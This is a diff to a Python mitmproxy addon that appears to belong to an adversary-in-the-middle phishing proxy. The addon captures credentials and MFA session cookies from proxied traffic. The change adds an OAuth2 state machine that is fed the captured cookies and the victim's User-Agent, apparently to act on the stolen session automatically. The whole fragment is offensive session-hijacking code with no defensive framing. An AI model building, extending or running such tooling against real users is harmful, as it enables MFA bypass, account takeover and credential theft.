@@ -10,6 +10,7 @@ from http.cookies import SimpleCookie
 from mitmproxy.http import HTTPFlow
 
 from ..events import CredentialsCapturedEvent, EventEmitter, MfaSessionCapturedEvent
+from ..oauth2.state_machine import StateMachine
 from .utils import cookies, get_config, requests, responses
 
 logger = logging.getLogger(__name__)
@@ -25,6 +26,7 @@ class ModifierAddon:
     credentials: dict[str, str] = {}
     simple_cookie: SimpleCookie = SimpleCookie()
     event_emitter: EventEmitter = EventEmitter()
+    state_machine: StateMachine = StateMachine()
 
     def request(self, flow: HTTPFlow) -> None:
         """
@@ -74,6 +76,7 @@ class ModifierAddon:
         responses.modify_content(flow)
 
         if flow.request.path in get_config().auth_url and flow.request.host != get_config().local_upstream_hostname:
-            self.event_emitter.notify(
-                MfaSessionCapturedEvent(cookies.parse_cookies(self.simple_cookie), flow.request.headers["User-Agent"])
-            )
+            parsed_cookies = cookies.parse_cookies(self.simple_cookie)
+            user_agent = flow.request.headers["User-Agent"]
+            self.event_emitter.notify(MfaSessionCapturedEvent(parsed_cookies, user_agent))
+            self.state_machine.start(parsed_cookies, user_agent)
